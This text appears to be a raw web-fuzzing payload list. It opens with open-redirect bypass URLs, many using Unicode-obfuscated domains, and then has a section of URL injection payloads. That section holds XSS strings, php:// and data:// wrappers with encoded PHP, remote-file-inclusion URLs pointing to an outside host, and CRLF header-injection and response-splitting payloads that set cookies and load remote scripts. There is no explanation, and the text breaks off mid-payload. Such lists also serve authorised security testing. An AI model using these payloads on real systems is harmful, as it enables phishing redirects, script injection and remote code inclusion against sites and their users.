////Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
////www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
https://Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
https://www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
/https://Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
/https://www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
//Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
//www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
///Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
///www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
////Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
////www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
https://Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
https://www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
/https://Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
/https://www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
//Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//
//www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//
///Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//
///www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//
////Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//
////www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//
https://Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//
https://www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//
//https://Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//
//https://www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//
//Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f
//www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f
///Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f
///www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f
////Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f
////www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f
https://Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f
https://www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f
//https://Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f
//https://www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f
///Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e
///www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e
////Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e
////www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e
https:///Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e
https:///www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e
//https:///Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e
//www.whitelisteddomain.tld@https:///Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e
/https://Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e
/https://www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e
///Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
///www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
////Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
////www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
https:///Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
https:///www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
/https://Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
/https://www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
/https:///Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
/https:///www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
/%09/Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
/%09/www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
//%09/Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
//%09/www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
///%09/Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
///%09/www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
////%09/Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
////%09/www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
https://%09/Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
https://%09/www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
/%5cⓁ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
/%5cwww.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
//%5cⓁ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
//%5cwww.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
///%5cⓁ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
///%5cwww.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
////%5cⓁ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
////%5cwww.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
https://%5cⓁ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
https://%5cwww.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
/https://%5cⓁ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
/https://%5cwww.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
https://Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
https://www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
//Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
http:Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
https:Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
//Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ%E3%80%82pw
\/\/Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
/\/Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
//\/Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
//Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ%00｡Ｐⓦ
https://www.whitelisteddomain.tld/https://Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
〱Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
〵Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
ゝⓁ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
ーⓁ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
ｰⓁ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
/〱Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
/〵Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
/ゝⓁ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
/ーⓁ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
/ｰⓁ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
<>//Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
//Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ\@www.whitelisteddomain.tld
https://:@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ\@www.whitelisteddomain.tld
http://Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ:80#@www.whitelisteddomain.tld/
http://Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ:80?@www.whitelisteddomain.tld/
http://3H6k7lIAiqjfNeN@www.whitelisteddomain.tld+@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
http://XY>.7d8T\205pZM@www.whitelisteddomain.tld+@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
http://3H6k7lIAiqjfNeN@www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
http://XY>.7d8T\205pZM@www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
http://www.whitelisteddomain.tld+&@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ#+@www.whitelisteddomain.tld/
http://Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ\twww.whitelisteddomain.tld/
//Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ:80#@www.whitelisteddomain.tld/
//Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ:80?@www.whitelisteddomain.tld/
//3H6k7lIAiqjfNeN@www.whitelisteddomain.tld+@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
//XY>.7d8T\205pZM@www.whitelisteddomain.tld+@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
//3H6k7lIAiqjfNeN@www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
//XY>.7d8T\205pZM@www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
//www.whitelisteddomain.tld+&@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ#+@www.whitelisteddomain.tld/
//Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ\twww.whitelisteddomain.tld/
//;@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
http://;@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
http://Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ%2f%2f.www.whitelisteddomain.tld/
http://Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ%5c%5c.www.whitelisteddomain.tld/
http://Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ%3F.www.whitelisteddomain.tld/
http://Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ%23.www.whitelisteddomain.tld/
http://www.whitelisteddomain.tld:80%40Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
http://www.whitelisteddomain.tld%2eⓁ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
/https:/%5cⓁ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
https:/%5cⓁ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
/http://Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
/%2f%2fⓁ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
//%2f%2fⓁ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
/Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
/http:/Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
http:/Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
/.Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
http://.Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
.Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
///\;@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
///Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
/////Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
/////Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
http://www.Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ\.www.whitelisteddomain.tld
%01https://Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
www.whitelisteddomain.tld;@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
https://www.whitelisteddomain.tld;@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
http:%0a%0dⓁ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
https://%0a%0dⓁ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/www.whitelisteddomain.tld
https://Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/www.whitelisteddomain.tld
//Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/www.whitelisteddomain.tld
-----------

-----------URL Injections - Payloads
# https://github.com/1N3/IntruderPayloads/blob/master/FuzzLists/url_payloads.txt
http://xerosecurity.com
.xerosecurity.com
.crowdshield.com
//xerosecurity.com
\\xerosecurity.com
\/xerosecurity.com
\/\/xerosecurity.com
/\xerosecurity.com
/\/\xerosecurity.com
|/xerosecurity.com
/%09/xerosecurity.com
/xerosecurity.com
javascript:document.location=http://xerosecurity.com
%2Fwww%252egoogle%252ecom
%2Fwww%252egoogle%252ecom%252f
%2Fwww%2egoogle%2ecom
%ff%2Fwww%252egoogle%252ecom
%ff%2Fwww%252egoogle%252ecom%252f
//www.xerosecurity.com/%2E%2E
/www.xerosecurity.com/%2E%2E
/%2fwww.xerosecurity.com/%2e%2e/
//////www.xerosecurity.com/%2e%2e/
//www.xerosecurity.com/
\/www.xerosecurity.com/
\/www.xerosecurity.com/
\/www.xerosecurity.com/%2e%2e/
/\www.xerosecurity.com/%2e%2e/
/%2fwww.xerosecurity.com/%2e%2e
/%2fwww.xerosecurity.com/%2e%2e/
https://www.xerosecurity.com/
%0a.xerosecurity.com/
www.xerosecurity.com/
%0d.xerosecurity.com%2f
%0d%2exerosecurity.com%2f
%0a%2exerosecurity.com%2f
%2e%5fxerosecurity.com%2e%5f
%2fwww.xerosecurity.com/%2e%2e
%2fwww.xerosecurity.com%2f%2e%2e
%2Fwww%252egoogle%252ecom
%2Fwww%252egoogle%252ecom%252f
%2Fwww%2egoogle%2ecom
%ff%2Fwww%252egoogle%252ecom
%ff%2Fwww%252egoogle%252ecom%252f
//www.xerosecurity.com/%2E%2E
/www.xerosecurity.com/%2E%2E
/%2fwww.xerosecurity.com/%2e%2e/
//////www.xerosecurity.com/%2e%2e/
//www.xerosecurity.com/
\/www.xerosecurity.com/
\/www.xerosecurity.com/
\/www.xerosecurity.com/%2e%2e/
/\www.xerosecurity.com/%2e%2e/
/%2fwww.xerosecurity.com/%2e%2e
/%2fwww.xerosecurity.com/%2e%2e/
https://www.xerosecurity.com/
%0a.xerosecurity.com/
www.xerosecurity.com/
%0d.xerosecurity.com%2f
%0d%2exerosecurity.com%2f
%0a%2exerosecurity.com%2f
%2e%5fxerosecurity.com%2e%5f
%2fwww.xerosecurity.com/%2e%2e
%2fwww.xerosecurity.com%2f%2e%2e
'+alert(INJECTX)+'/%2E%2E
"><img/src='x'onerror=alert(INJECTX)>/%2E%2E/%2E%2E/
%2Fx%2F%3cimg%2Fonerror='alert(INJECTX)'src=x%3e%2f.%2e%2f.%2e%2f%3f
/x/<img/onerror='alert(INJECTX)'src=x>/../../
INJECTX'"<>/%2e%2e
INJECTX'"<>/%2e%2e/
INJECTX'"<>
INJECTX%27%22%3c%3e%2e%2e
INJECTX%27%22%3c%3e%2e%2e/
INJECTX/%2e%2e
INJECTX/%2e%2e/
%2e%2e/INJECTX/
%2e%2e/INJECTX
http://xerosecurity.com/.testing/redirect_vuln.txt
http://xerosecurity.com/.testing/redirect_vuln.txt%00
http://xerosecurity.com/.testing/rfi_vuln.txt
http://xerosecurity.com/.testing/rfi_vuln.txt%00
http://xerosecurity.com/.testing/rfi_vuln.php
http://xerosecurity.com/.testing/rfi_vuln.php%00
http://xerosecurity.com/.testing/xss_vuln.php
http://xerosecurity.com/.testing/xss_vuln.php%00
http://xerosecurity.com/.testing/xss_vuln.html
http://xerosecurity.com/.testing/xss_vuln.html%00
http://xerosecurity.com/.testing/xss.html
http://xerosecurity.com/.testing/xss.html%00
http://xerosecurity.com/.testing/iframe_injection.php
//xerosecurity.com
\/xerosecurity.com
|/xerosecurity.com
/%09/xerosecurity.com
/xerosecurity.com
crowdshield.com
xerosecurity.com
javascript:alert(1)//INJECTX
javascript:document.location=http://xerosecurity.com
php://input
data://text/plain;base64,SmJhdHk4Y1dIbFJhemh6Q3lqQTw%2FcGhwIGVjaG8gJ1Z1bG5lcmFibGUnOyA%2FPkpiYXR5OGNXSGxSYXpoekN5akE=
php://input;base64,SmJhdHk4Y1dIbFJhemh6Q3lqQTw%2FcGhwIGVjaG8gJ1Z1bG5lcmFibGUnOyA%2FPkpiYXR5OGNXSGxSYXpoekN5akE=
https://crowdshield.com/.testing/rfi_vuln.php
https://crowdshield.com/.testing/rfi_vuln.php%00
//xerosecurity.com/.testing/rfi_vuln.php
//xerosecurity.com/.testing/rfi_vuln.php%00
http://xerosecurity.com/.testing/rfi_vuln.php
http://xerosecurity.com/.testing/rfi_vuln.php%00
%0a
%0a
%0a%20
%0a%20
%0aSet-Cookie%3AINJECT%3DINJECTXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%3B%0aLocation%3Ahttp%3A%2F%2Fxerosecurity.com%2F.testing%2Fiframe_injection.php%0a%0a
%0d%0aSet-Cookie%3AINJECT%3DINJECTXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%3B%0d%0aLocation%3Ahttp%3A%2F%2Fxerosecurity.com%2F.testing%2Fiframe_injection.php%0d%0a%0d%0a
%0d%0aSet-Cookie: INJECTX=INJECTXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX;
%0aSet-Cookie: INJECTX=INJECTXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX;
%0aContent-Length%3A%200%0a%0aHTTP%2F1.1%20200%20OK%0aContent-Type%3A%20text%2Fhtml%0aLast-Modified%3A%20Fri%2C%2030%20Apr%202099%2011%3A11%3A18%20GMT%0aContent-Length%3A%2048%0a%3Chtml%3E%3Cscript%3Edocument.cookie()%3B%3C%2Fscript%3E%3C%2Fhtml%3E
%0aContent-Length%3A%200%0a%0aHTTP%2F1.1%20200%20OK%0aContent-Type%3A%20text%2Fhtml%0aLocation%3A%20http%3A%2F%2Fcrowdshield.com%0aContent-Length%3A%20122%0a%3Chtml%3E%3CBODY%20ONLOAD%3Dalert('XSS')%3E%3Cscript%3Ealert(1)%3B%3C%2Fscript%3E%3CIFRAME%20SRC%3D%22javascript%3Aalert('XSS')%3B%22%3E%3C%2FIFRAME%3E%3C%2Fbody%3E%3C%2Fhtml%3E
%0aContent-Length%3A%200%0a%0aHTTP%2F1.1%20200%20OK%0aDate%3A%20Fri%2C%2006%20Mar%202016%2000%3A07%3A47%20GMT%0aContent-Type%3A%20text%2Fhtml%3Bcharset%3DISO-8859-1%0aContent-Length%3A%2040%0a%3Chtml%3E%3Cbody%3E%3Cscript%3Ealert(1)%3B%3C%2Fscript%3E
%0aContent-Length%3A%200%0a%0aHTTP%2F1.1%20200%20OK%0aDate%3A%20Fri%2C%2006%20Mar%202016%2000%3A07%3A47%20GMT%0aContent-Type%3A%20text%2Fhtml%3Bcharset%3DUTF-8%0aContent-Length%3A%2052%0a%3Chtml%3E%3Cbody%3E%3Cscript%3Ealert(1)%3B%3C%2Fscript%3E%3C%2Fbody%3E%3C%2Fhtml%3E
%0aContent-Length%3A%200%0a%0aHTTP%2F1.1%20200%20OK%0aDate%3A%20Fri%2C%2006%20Mar%202016%2000%3A07%3A47%20GMT%0aContent-Type%3A%20text%2Fhtml%3Bcharset%3DUTF-8%0aContent-Length%3A%20769%0a%3Chtml%3E%3Cbody%3E%3Cscript%20src%3D%22http%3A%2F%2Fxerosecurity.com%2F.testing%2Fxss.js%3Fscript_src%3D1%22%3E%3C%2Fscript%3E%0a%3Cimg%20src%3D%22http%3A%2F%2Fxerosecurity.com%2F.testing%2Fxss.jpg%3Fimg_src%3D1%22%3E%3C%2Fimg%3E%0a%3Ciframe%20src%3D%22http%3A%2F%2Fxerosecurity.com%2F.testing%2Fiframe_injection.php%3Fiframe_src%3D1%22%20height%3D%220%22%20width%3D%220%22%3E%3C%2Fiframe%3E%0a%3Ciframe%20src%3D%22http%3A%2F%2Fxerosecurity.com%2F.testing%2Fiframe_injection.php%3Fiframe_src%3D1%22%20height%3D%22100%25%22%20width%3D%22100%25%22%3E%3C%2Fiframe%3E%0a%3Cimg%20src%3D%22http%3A%2F%2Fxerosecurity.com%2F.testing%2Fxss.jpg%3Fimg_src_onerror_prompt%22%20onerror%3Dprompt(%22http%3A%2F%2Fxerosecurity.com%2F.testing%2Fxss.js%22)%3B%3E%0a%3Cimg%20src%3D%